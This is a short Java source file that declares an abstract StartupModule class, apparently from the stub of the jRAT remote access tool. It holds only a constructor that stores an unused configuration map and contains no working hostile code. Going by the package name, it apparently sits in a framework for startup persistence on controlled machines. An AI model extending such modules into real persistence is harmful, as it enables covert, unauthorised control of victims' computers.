package su.jrat.stub.modules.startup;

import java.util.Map;

import su.jrat.stub.modules.Module;

public abstract class StartupModule extends Module {
	
	@SuppressWarnings("unused")
	private Map<String, String> config;
	
	public StartupModule(Map<String, String> config) {
		this.config = config;
	}
	
}
